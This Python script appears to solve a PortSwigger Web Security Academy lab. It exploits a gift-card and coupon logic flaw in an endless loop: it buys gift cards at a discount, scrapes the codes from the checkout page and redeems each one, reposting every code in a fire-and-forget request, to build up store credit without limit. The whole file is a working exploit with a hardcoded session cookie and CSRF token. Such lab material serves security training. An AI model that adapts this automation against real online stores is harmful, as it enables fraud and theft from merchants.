import requests
import re

session = requests.session()

while True:
    # ADD GIFT CARDS TO THE BASKET
    burp1_url = "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net:443/cart"
    burp0_cookies = {"session": "TZtbpA9M9pnCnH3IOeP7ruHXBMUODNj5"}
    burp1_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net/product?productId=2", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Priority": "u=0, i"}
    burp1_data = {"productId": "2", "redir": "PRODUCT", "quantity": "10"}
    response = session.post(burp1_url, headers=burp1_headers, cookies=burp0_cookies, data=burp1_data)
    assert response.status_code == 200

    print("Added to the basket")

    # APPLY COUPON
    burp2_url = "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net:443/cart/coupon"
    burp2_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net/cart", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Priority": "u=0, i"}
    burp2_data = {"csrf": "HlZRuRaxQQBpjhSEI5aKBDCq71WTkF6E", "coupon": "SIGNUP30"}
    response = session.post(burp2_url, headers=burp2_headers, cookies=burp0_cookies, data=burp2_data)
    assert response.status_code == 200

    print("Applied coupon")

    # PLACE ORDER
    burp3_url = "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net:443/cart/checkout"
    burp3_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net/cart", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Priority": "u=0, i"}
    burp3_data = {"csrf": "HlZRuRaxQQBpjhSEI5aKBDCq71WTkF6E"}
    response = session.post(burp3_url, headers=burp3_headers, cookies=burp0_cookies, data=burp3_data)
    assert response.status_code == 200

    print("Placed the order")

    # REDEEM GIFT CARDS
    response_containing_codes = response.text.split("You have bought the following gift cards")[1]
    codes = re.findall(r"<td>(?P<codes>.+)?</td>", response_containing_codes, re.MULTILINE)

    burp4_url = "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net:443/gift-card"
    burp4_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0af6004503968ade80ea0d4000b500f7.web-security-academy.net/my-account", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Priority": "u=0, i"}
    burp4_data = {"csrf": "HlZRuRaxQQBpjhSEI5aKBDCq71WTkF6E", "gift-card": "ooqCjwlm1d"}

    for code in codes:
        burp4_data["gift-card"] = code
        session.post(burp4_url, headers=burp4_headers, cookies=burp0_cookies, data=burp4_data)

        # Fast and hacky way to fire and forget the request
        try:
            session.post(burp4_url, headers=burp4_headers, cookies=burp0_cookies, data=burp4_data, timeout=0.000001)
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout): 
            pass
        
        print("Reedemed gift card")